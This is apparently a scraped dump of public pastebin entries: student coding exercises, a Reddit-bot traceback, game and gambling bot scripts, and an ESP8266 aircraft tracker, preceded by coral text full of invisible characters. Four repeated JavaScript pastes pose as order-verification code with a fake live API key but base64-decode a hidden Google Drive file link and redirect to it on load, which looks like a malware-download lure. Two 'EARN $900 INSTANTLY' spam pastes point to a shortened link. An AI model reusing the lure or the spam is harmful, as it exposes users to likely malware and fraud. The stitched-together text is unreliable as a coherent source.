‎b‎e‎t‎w‎e‎e‎n‎ ‎2‎ ‎m‎e‎t‎r‎e‎s‎ ‎(‎6‎.‎6‎ ‎f‎t‎)‎ ‎a‎n‎d‎ ‎1‎5‎ ‎m‎e‎t‎r‎e‎s‎ ‎(‎4‎9‎ ‎f‎t‎)‎.‎ ‎S‎m‎a‎l‎l‎ ‎c‎o‎l‎o‎n‎i‎e‎s‎ ‎o‎f‎ ‎G‎.‎ ‎f‎a‎s‎c‎i‎c‎u‎l‎a‎r‎i‎s‎ ‎o‎f‎t‎e‎n‎ ‎f‎o‎r‎m‎ ‎l‎o‎w‎ ‎d‎o‎m‎e‎s‎ ‎b‎u‎t‎ ‎a‎s‎ ‎t‎h‎e‎y‎ ‎g‎r‎o‎w‎,‎ ‎t‎h‎e‎ ‎c‎o‎l‎o‎n‎i‎e‎s‎ ‎b‎e‎c‎o‎m‎e‎ ‎m‎o‎r‎e‎ ‎i‎r‎r‎e‎g‎u‎l‎a‎r‎,‎ ‎m‎a‎s‎s‎i‎v‎e‎l‎y‎ ‎h‎u‎m‎m‎o‎c‎k‎y‎ ‎o‎r‎ ‎c‎o‎l‎u‎m‎n‎a‎r‎,‎ ‎a‎n‎d‎ ‎m‎a‎y‎ ‎e‎v‎e‎n‎t‎u‎a‎l‎l‎y‎ ‎r‎e‎a‎c‎h‎ ‎5‎ ‎m‎e‎t‎r‎e‎s‎ ‎(‎1‎6‎ ‎f‎t‎)‎ ‎a‎c‎r‎o‎s‎s‎.‎ ‎T‎h‎e‎ ‎i‎n‎d‎i‎v‎i‎d‎u‎a‎l‎ ‎p‎o‎l‎y‎p‎s‎ ‎a‎r‎e‎ ‎e‎m‎b‎e‎d‎d‎e‎d‎ ‎i‎n‎ ‎c‎i‎r‎c‎u‎l‎a‎r‎,‎ ‎t‎u‎b‎e‎-‎s‎h‎a‎p‎e‎d‎ ‎c‎o‎r‎a‎l‎l‎i‎t‎e‎s‎ ‎l‎e‎s‎s‎ ‎t‎h‎a‎n‎ ‎1‎ ‎c‎e‎n‎t‎i‎m‎e‎t‎r‎e‎ ‎(‎0‎.‎3‎9‎ ‎i‎n‎)‎ ‎a‎c‎r‎o‎s‎s‎,‎ ‎m‎a‎d‎e‎ ‎o‎f‎ ‎a‎ ‎l‎i‎m‎y‎ ‎m‎a‎t‎e‎r‎i‎a‎l‎ ‎e‎x‎t‎r‎u‎d‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎p‎o‎l‎y‎p‎s‎.‎ ‎L‎i‎n‎i‎n‎g‎ ‎t‎h‎e‎ ‎c‎o‎r‎a‎l‎l‎i‎t‎e‎s‎ ‎a‎r‎e‎ ‎a‎ ‎l‎a‎r‎g‎e‎ ‎n‎u‎m‎b‎e‎r‎ ‎o‎f‎ ‎r‎i‎d‎g‎e‎-‎l‎i‎k‎e‎ ‎s‎e‎p‎t‎a‎ ‎r‎a‎d‎i‎a‎t‎i‎n‎g‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎c‎e‎n‎t‎r‎e‎.‎ ‎T‎h‎e‎ ‎p‎o‎l‎y‎p‎s‎ ‎o‎f‎t‎e‎n‎ ‎f‎e‎e‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎d‎a‎y‎t‎i‎m‎e‎,‎ ‎a‎n‎d‎ ‎w‎h‎e‎n‎ ‎t‎h‎e‎i‎r‎ ‎t‎e‎n‎t‎a‎c‎l‎e‎s‎ ‎a‎r‎e‎ ‎e‎x‎t‎e‎n‎d‎e‎d‎ ‎t‎h‎e‎ ‎b‎a‎s‎i‎c‎ ‎s‎k‎e‎l‎e‎t‎o‎n‎ ‎o‎f‎ ‎t‎h‎e‎ ‎c‎o‎r‎a‎l‎ ‎i‎s‎ ‎h‎i‎d‎d‎e‎n‎.‎ ‎T‎h‎e‎ ‎g‎e‎n‎e‎r‎a‎l‎ ‎c‎o‎l‎o‎u‎r‎ ‎o‎f‎ ‎t‎h‎e‎ ‎c‎o‎r‎a‎l‎ ‎r‎a‎n‎g‎e‎s‎ ‎f‎r‎o‎m‎ ‎g‎r‎e‎e‎n‎ ‎a‎n‎d‎ ‎g‎r‎e‎y‎ ‎t‎o‎ ‎r‎e‎d‎d‎i‎s‎h‎ ‎b‎r‎o‎w‎n‎.‎ ‎T‎h‎e‎ ‎t‎e‎n‎t‎a‎c‎l‎e‎s‎ ‎a‎r‎e‎ ‎o‎f‎t‎e‎n‎ ‎a‎ ‎c‎o‎n‎t‎r‎a‎s‎t‎i‎n‎g‎ ‎c‎o‎l‎o‎u‎r‎ ‎a‎n‎d‎ ‎a‎r‎e‎ ‎u‎s‎u‎a‎l‎l‎y‎ ‎t‎i‎p‎p‎e‎d‎ ‎w‎i‎t‎h‎ ‎w‎h‎i‎t‎e‎.‎ ‎T‎h‎i‎s‎ ‎G‎.‎ ‎f‎a‎s‎c‎i‎c‎u‎l‎a‎r‎i‎s‎ ‎c‎o‎l‎o‎n‎y‎ ‎w‎a‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎R‎e‎d‎ ‎S‎e‎a‎ ‎o‎f‎f‎ ‎t‎h‎e‎ ‎c‎o‎a‎s‎t‎ ‎o‎f‎ ‎E‎g‎y‎p‎t‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎D‎i‎e‎g‎o‎ ‎D‎e‎l‎s‎o‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎y‎e‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎c‎o‎o‎l‎ ‎d‎o‎w‎n‎ ‎t‎h‎e‎ ‎r‎e‎d‎ ‎p‎l‎a‎n‎e‎t‎ ‎s‎o‎ ‎i‎t‎'‎s‎ ‎i‎c‎y‎ ‎b‎l‎u‎e‎.‎ ‎A‎s‎ ‎m‎a‎n‎y‎ ‎o‎f‎ ‎y‎o‎u‎ ‎k‎n‎o‎w‎,‎ ‎g‎l‎o‎b‎a‎l‎ ‎w‎a‎r‎m‎i‎n‎g‎ ‎w‎i‎l‎l‎ ‎m‎a‎k‎e‎ ‎i‎t‎ ‎s‎o‎ ‎t‎h‎e‎ ‎e‎a‎r‎t‎h‎ ‎w‎i‎l‎l‎ ‎b‎e‎ ‎u‎n‎i‎n‎h‎a‎b‎i‎t‎a‎b‎l‎e‎ ‎p‎r‎e‎t‎t‎y‎ ‎s‎o‎o‎n‎.‎ ‎S‎o‎ ‎t‎h‎a‎t‎ ‎m‎e‎a‎n‎s‎ ‎w‎e‎'‎r‎e‎ ‎g‎o‎n‎n‎a‎ ‎h‎a‎v‎e‎ ‎t‎o‎ ‎g‎o‎ ‎t‎o‎ ‎a‎n‎o‎t‎h‎e‎r‎ ‎p‎l‎a‎n‎e‎t‎.‎ ‎I‎'‎m‎ ‎t‎h‎i‎n‎k‎i‎n‎g‎ ‎o‎f‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎m‎a‎r‎s‎.‎"
8JKzVnzM,RequestException: error with request,basedcount_bot,Python,Wednesday 16th of April 2025 12:28:54 PM CDT,"Traceback (most recent call last):
  File ""/home/gmktec/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/home/gmktec/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 123, in check_mail
    async for message in reddit_instance.inbox.unread(limit=None):  # Message
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 37, in __anext__
    await self._next_batch()
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 90, in _next_batch
    self._listing = await self._reddit.get(self.url, params=self.params)
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 54, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 813, in get
    return await self._objectify_request(method=""GET"", params=params, path=path)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 570, in _objectify_request
    await self.request(
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 54, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 1061, in request
    return await self._core.request(
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 383, in request
    return await self._request_with_retries(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 286, in _request_with_retries
    response, saved_exception = await self._make_request(
                                ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 192, in _make_request
    response = await self._rate_limiter.call(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/rate_limit.py"", line 51, in call
    response = await request_function(*args, **kwargs)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/requestor.py"", line 80, in request
    raise RequestException(exc, args, kwargs) from None
asyncprawcore.exceptions.RequestException: error with request 
"
Zph06ZZU,05. Training Lab,nevenailievaa,JavaScript,Wednesday 16th of April 2025 12:27:33 PM CDT,"function trainingLab(w, h) {
    let lengthCm = w * 100;
    let widthCm = h * 100;

    let rows = Math.floor(lengthCm / 120);
    let cols = Math.floor((widthCm - 100) / 70);

    let totalSeats = rows * cols - 3;
    console.log(totalSeats);
}"
Y1dxHFTC,26 AB два указателя,nq1s788,Python,Wednesday 16th of April 2025 12:24:47 PM CDT,"#https://inf-ege.sdamgia.ru/problem?id=38960
data = open('26 (2).txt').readlines()
n, S = map(int, data[0].split())
a = []
for e in data[1:]:
    c, t = e.split()
    c = int(c)
    a.append((c, t))
a.sort()
s = 0 #текущая сумма
cnt = 0 #кол-во взятых
cnt_a = 0
for e in a:
    if s + e[0] <= S:
        s += e[0]
        cnt += 1
        if e[1] == 'A':
            cnt_a += 1
l = cnt - 1
r = cnt
while 1:
    while l >= 0 and a[l][1] == 'A':
        l -= 1
    while r < n and a[r][1] == 'B':
        r += 1
    if l < 0 or r >= n:
        break
    if s - a[l][0] + a[r][0] <= S:
        s = s - a[l][0] + a[r][0]
        cnt_a += 1
        l -= 1
        r += 1
    else:
        break
print(cnt_a, S - s)"
KrAf7P6X,EARN $900 INSTANTLY 2025⭐ G8,rod005,JavaScript,Wednesday 16th of April 2025 12:22:05 PM CDT," 
Pdf https://tinyurl.com/privguidee


im3g7gMJdq
"
Rg3dSUy7,Untitled,zebmekey,JavaScript,Wednesday 16th of April 2025 12:15:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46352/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8F8ypVf0,Make $1000 15-MINUTES  (BEGINNER) HV,rod005,JavaScript,Wednesday 16th of April 2025 12:08:40 PM CDT," 
Pdf https://tinyurl.com/privguidee


KwMZxZCUSO
"
9K3QNqRm,Products.js,zebmekey,JavaScript,Wednesday 16th of April 2025 12:00:13 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65591/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xs9bV4pr,fastdigging,dicekode,Lua,Wednesday 16th of April 2025 11:57:13 AM CDT,"boost   = 2
round   = 10
digadd  = 1
basebet = 0.0001
prebet  = basebet
multi   = 1.13
multir  = 0.01
maxbal  = balance * 1.25
lastbet = basebet
multif  = multi
roundf  = round

count   = 0
level   = 0
levelmx = 0
nextbet = prebet
chance  = 90
digging = false
status  = ""START""
profitc = 0


function betpayout(_partial,_chance,_multi)
    return math.abs(_partial)/((99/_chance)-1)*_multi
end

function dobet()
    
    chance  = math.random(946, 1236) / 100
    profitc = profitc + currentprofit
    
    if profitc >= 0 then
        profitc = 0
        round   = roundf
    end

    if digging then
        level  = level + 1
        count  = count + 1
        status = ""D ""
        if win then 
            level   = 0 
            count   = 0
            lastbet = basebet
            nextbet = prebet
            multi   = multif
            digging = false
        else
            if count > round then
                count   = 0
                digging = false
                multi   = multi - multir
                nextbet = prebet
            else
                status  = status .. count..""/""..round
                nextbet = math.max(previousbet * multi,betpayout(profitc,chance,boost))
                lastbet = nextbet 
            end 
        end
    else
        status = ""P    ""
        if win then
            digging = true
            nextbet = lastbet
            bethigh = not bethigh
            round   = round + digadd
        else
            nextbet = prebet
        end
    end
    
    if balance > maxbal then stop() end
    if level > levelmx then levelmx = level end
    info = status.."".\t""..level..""/""..levelmx..""\t[""..multi..""]""
    print(""++ ""..info)
end"
Jwgnbpsg,warcaby,Cassimus,C++,Wednesday 16th of April 2025 11:47:45 AM CDT,"#include <iostream>
#include <stdio.h>
#include <string>

using namespace std;

const string PAWN = ""O"";

void init_board(int board[8][8]);
int get_row(string kind_of_move);
int get_column(string kind_of_move);
void draw_board(int board[8][8], bool is_white_move);
void clr_screen() { printf(""\033[H\033[J""); } // czyszczenie ekranu
void draw_white_field();
void draw_black_field();
void draw_white_pawn();
void draw_black_pawn();

int main(int argc, char const *argv[])
{
    // 0- biale pole, 1-czarne puste pole, 2 -czarny pion , 3 - bialy pion
    int board[8][8];
    bool is_white_move = true;

    int white_pawns = 12;
    int black_pawns = 12;

    int col_from = 0;
    int row_from = 0;
    int col_to = 0;
    int row_to = 0;

    init_board(board);

    while (white_pawns > 0 && black_pawns > 0)
    {
        draw_board(board, is_white_move);

        // pobranie ruchu
        col_from = get_column(""skad"");
        row_from = get_row(""skad"");
        col_to = get_column(""dokad"");
        row_to = get_row(""dokad"");
    }
}

int get_row(string kind_of_move)
{
    cout << ""Podaj numer wiersza ""<< kind_of_move <<"" chcesz ruszyć "" << endl;
    int row;
    cin >> row;
     return row--;
}

int get_column(string kind_of_move)
{
    cout << ""Podaj literę kolumny ""<< kind_of_move <<"" chcesz się ruszyć"" << endl;
    char temp;
    cin >> temp;
    return toupper(temp) - 65;
}

void init_board(int board[8][8])
{
    for (int row = 0; row < 8; row++)
    {
        for (int col = 0; col < 8; col++)
        {
            if ((row + col) % 2 == 0)
            {
                board[row][col] = 0;
            }
            else
            {
                if (row < 3)
                {
                    board[row][col] = 2;
                }
                else if (row > 4)
                {
                    board[row][col] = 3;
                }
                else
                {
                    board[row][col] = 1;
                }
            }
        }
    }
}

void draw_board(int board[8][8], bool is_white_move)
{
    clr_screen();

    if (is_white_move)
    {
        cout << ""Ruch wykonuja biale"" << endl;
    }
    else
    {
        cout << ""Ruch wykonuja czarne"" << endl;
    }
    cout << endl;

    cout << ""  ABCDEFGH"" << endl;
    for (int row = 0; row < 8; row++)
    {
        printf(""\033[37m"");
        cout << row + 1 << "" "";
        for (int col = 0; col < 8; col++)
        {
            if (board[row][col] == 0)
            {
                draw_white_field();
            }
            else if (board[row][col] == 1)
            {
                draw_black_field();
            }
            else if (board[row][col] == 2)
            {
                draw_black_pawn();
            }
            else if (board[row][col] == 3)
            {
                draw_white_pawn();
            }
        }
        cout << endl;
    }
}

void draw_white_field()
{
    printf(""\033[37m"");
    cout << ""#"";
}

void draw_black_field()
{
    printf(""\033[30m"");
    cout << "" "";
}
void draw_white_pawn()
{
    printf(""\033[37m"");
    cout << PAWN;
}
void draw_black_pawn()
{
    printf(""\033[31m"");
    cout << PAWN;
}"
GvV1pEgg,Order.js,zebmekey,JavaScript,Wednesday 16th of April 2025 11:44:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/00829/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YejFwqJP,[NP] Student Hall Of Fame,dzocesrce,Java,Wednesday 16th of April 2025 11:33:23 AM CDT,"import java.util.*;
import java.util.function.Predicate;
import java.util.stream.Collectors;

class Student implements Comparable<Student> {
    String id;
    List<Integer> grades;

    public Student(String id, List<Integer> grades) {
        this.id = id;
        this.grades = grades;
    }

    public double average() {
        return grades.stream().mapToDouble(i -> i).average().getAsDouble();
    }

    public int getYear() {
        return (24 - Integer.parseInt(id.substring(0, 2)));
    }

    public int totalCourses() {
        return Math.min(getYear() * 10, 40);
    }

    public double labAssistantPoints() {
        return average() * ((double) grades.size() / totalCourses()) * (0.8 + ((getYear()-1)*0.2)/3.0);
    }

    @Override
    public int compareTo(Student o) {
        return Comparator.comparing(Student::labAssistantPoints)
                .thenComparing(Student::average)
                .compare(this, o);
    }

    @Override
    public String toString() {
        return String.format(""Student %s (%d year) - %d/%d passed exam, average grade %.2f.\nLab assistant points: %.2f"", id, getYear(), grades.size(), totalCourses(), average(), labAssistantPoints());
    }
}


public class FilterAndSortTest {
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        int testCase = Integer.parseInt(sc.nextLine());
        int n = Integer.parseInt(sc.nextLine());

        if (testCase == 1) { // students
            int studentScenario = Integer.parseInt(sc.nextLine());
            List<Student> students = new ArrayList<>();
            while (n > 0) {

                String line = sc.nextLine();
                String[] parts = line.split(""\\s+"");
                String id = parts[0];
                List<Integer> grades = Arrays.stream(parts).skip(1).map(Integer::parseInt).collect(Collectors.toList());
                students.add(new Student(id, grades));
                --n;
            }

            if (studentScenario == 1) {
                //TODO filter and sort all students who have at least 8.0 points and are at least 3rd year student
                List<Student> student_results= students.stream().filter(i->i.labAssistantPoints()>=8&&i.getYear()>2).sorted(Comparator.reverseOrder())
                        .collect(Collectors.toList());
                if(student_results.size()==0)
                    try {
                        throw new EmptyResultException(""No element met the criteria"");
                    } catch (EmptyResultException e) {
                        System.out.println(e.getMessage());
                    }
                student_results.stream().forEach(i-> System.out.println(i));


            } else {
                //TODO filter and sort all students who have passed at least 90% of their total courses with an average grade of at least 9.0
                List<Student> student_results= students.stream().filter(i->i.average()>=9&&i.grades.size()>=i.totalCourses()*0.9).sorted(Comparator.reverseOrder())
                        .collect(Collectors.toList());
                if(student_results.size()==0)
                    try {
                        throw new EmptyResultException(""No element met the criteria"");
                    } catch (EmptyResultException e) {
                        System.out.println(e.getMessage());
                    }
                student_results.stream().forEach(i-> System.out.println(i));
            }
        } else { //integers
            List<Integer> integers = new ArrayList<>();
            while (n > 0) {
                integers.add(Integer.parseInt(sc.nextLine()));
                --n;
            }

            //TODO filter and sort all even numbers divisible with 15
            List<Integer> integer_results =integers.stream().filter(i->i%30==0)
                    .sorted(Comparator.reverseOrder()).collect(Collectors.toList());
            if(integer_results.size()==0)
                try {
                    throw new EmptyResultException(""No element met the criteria"");
                } catch (EmptyResultException e) {
                    System.out.println(e.getMessage());
                }
            integer_results.stream().forEach(i-> System.out.println(i));
            
        }

    }
}
class EmptyResultException extends Exception{
    public EmptyResultException(String message) {
        super(message);
    }
}
"
3QtQV8Li,Untitled,martintokio,Lua,Wednesday 16th of April 2025 11:30:30 AM CDT,"--[[
  Just add:
  NPC.say(""balance"") 
  return true
  in a function and the lua will do automatically the rest of the job, just be sure to write ""balance"" to bank NPC.
]]

local settings = {
  keepAmount = 5000000, -- Amount of balance to keep on character
  receiverName = ""Nombre"", -- Name of Character to Send Money To
  minTransferAmount = 1000 -- If below this amount, it will not transfer.
}

onTalk(function(name, level, mode, text, channelId, pos)
  if mode ~= 51 then return end

  local balance_text = string.match(text, ""account balance is (%d+) gold"")
  if not balance_text then return end

  local currentGold = tonumber(balance_text)
  local toTransfer = currentGold - settings.keepAmount

  if toTransfer >= settings.minTransferAmount then
    CaveBot.delay(5000)
    CaveBot.Conversation(""transfer"", toTransfer, settings.receiverName, ""yes"")
    print(string.format(""[Transfer] Sent %d gp to %s"", toTransfer, settings.receiverName))
  else
    print(""[Transfer] Not enough balance to transfer! ("" .. currentGold .."")"")
  end
end)
"
gqix0iDn,Market.js,zebmekey,JavaScript,Wednesday 16th of April 2025 11:28:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65026/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
muhuGLLX,ESP8266 - Lon-Lat Aircraft Tracker,TraumaticAI,C++,Wednesday 16th of April 2025 11:27:05 AM CDT,"#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>
#include <ArduinoJson.h>

// WiFi credentials
const char* ssid = ""YOUR_SSID_HERE"";
const char* password = ""YOUR_PASSWORD_HERE"";

// Web server on port 80
ESP8266WebServer server(80);

// Coordinates (Lon,Lat)
const float LAT = ######; // Replace ""######"" with your LAT
const float LON = ######; // Replace ""######"" with your LON
int RADIUS = 2;  // Modifiable (in nautical miles)

// Update intervals
const unsigned long UPDATE_INTERVAL = 8000;  // 8 seconds for API update
unsigned long lastUpdate = 0;
unsigned long lastDataTime = 0;
float seenTime = 0;
float initialSeenTime = 0;

// Aircraft data storage
String currentCallsign = """";
String currentType = """";
String currentHex = ""N/A"";
float currentAlt = 0;
float currentSpeed = 0;
float currentDirection = 0;
float currentDistance = 0;
bool hasAircraftData = false;

// Aircraft counter
unsigned long lastResetTime = 0;
int aircraftCount = 0;
String seenCallsigns[50]; //Max Count is 50 due to RAM limitations on the ESP
int seenCallsignsIndex = 0;
const unsigned long DAY_LENGTH = 86400000;  // 24 hours

// LED configuration
const int LED_PIN = 2;  // Built-in blue LED on most ESP8266 boards (GPIO2, D4)
unsigned long lastFadeUpdate = 0;
const unsigned long FADE_INTERVAL = 20;  // Update fade every 20ms for smooth effect
int fadeValue = 0;  // Current PWM value (0-1023)
bool fadeDirection = true;  // true = increasing, false = decreasing

// HTML for the web interface (Home Assistant style)
const char* htmlPage = R""rawliteral(
<!DOCTYPE html>
<html lang=""en"">
<head>
  <meta charset=""UTF-8"">
  <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
  <title>Aircraft Tracker</title>
  <style>
    body {
      background: #1c2526;
      color: #e0e0e0;
      font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      margin: 0;
      padding: 0.5rem;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
      box-sizing: border-box;
    }
    .card {
      background-color: #212121;
      border-radius: 0.5rem;
      padding: 1rem;
      width: 100%;
      max-width: 600px;
      min-width: 280px;
      box-sizing: border-box;
      box-shadow: 0 0.0625rem 0.1875rem rgba(0,0,0,0.3);
      position: relative; /* For absolute positioning of api-status */
    }
    .card-header {
      font-size: 1rem;
      color: #03a9f4;
      margin: 0 0 0.75rem 0;
      font-weight: 500;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }
    .data-grid {
      display: grid;
      grid-template-columns: auto 1fr;
      gap: 0.5rem;
      font-size: 0.875rem;
    }
    .data-label {
      color: #b0b0b0;
      font-weight: bold;
      padding-right: 0.5rem;
    }
    .data-value {
      color: #e0e0e0;
    }
    .settings {
      margin-top: 0.75rem;
      padding-top: 0.75rem;
      border-top: 0.0625rem solid #424242;
    }
    .settings-row {
      display: flex;
      gap: 0.5rem;
      flex-wrap: wrap;
      align-items: center;
    }
    label {
      color: #b0b0b0;
      font-size: 0.875rem;
      font-weight: bold;
    }
    input[type=""number""] {
      background-color: #424242;
      color: #e0e0e0;
      border: 0.0625rem solid #616161;
      border-radius: 0.25rem;
      padding: 0.25rem;
      font-size: 0.875rem;
      width: 3.75rem;
      box-sizing: border-box;
    }
    button {
      background-color: #03a9f4;
      color: #fff;
      border: none;
      border-radius: 0.25rem;
      padding: 0.375rem 0.75rem;
      cursor: pointer;
      font-size: 0.875rem;
      transition: background-color 0.2s;
    }
    button:hover {
      background-color: #0288d1;
    }
    .track-button {
      background-color: #4caf50;
      width: 6.25rem;
    }
    .track-button:hover {
      background-color: #43a047;
    }
    .track-button:disabled {
      background-color: #616161;
      cursor: not-allowed;
    }
    #status {
      margin-top: 0.5rem;
      font-size: 0.75rem;
      color: #757575;
      text-align: center;
    }
    .loading-spinner {
      display: inline-block;
      width: 16px;
      height: 16px;
      border: 2px solid #03a9f4;
      border-radius: 50%;
      border-top-color: transparent;
      animation: spin 1s linear infinite;
      vertical-align: middle;
    }
    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }
    .success-icon {
      color: #4caf50;
      vertical-align: middle;
    }
    .api-status {
      position: absolute;
      bottom: 1rem;
      right: 1rem;
      display: flex;
      align-items: center;
      gap: 0.25rem;
      font-size: 0.875rem;
    }
    .api-label {
      color: rgba(176, 176, 176, 0.5); /* Semi-transparent #b0b0b0 */
      font-weight: bold;
    }
    @media (max-width: 400px) {
      .card {
        padding: 0.75rem;
        min-width: 200px;
      }
      .card-header {
        font-size: 0.875rem;
      }
      .data-grid {
        font-size: 0.75rem;
        gap: 0.375rem;
      }
      input[type=""number""], button {
        font-size: 0.75rem;
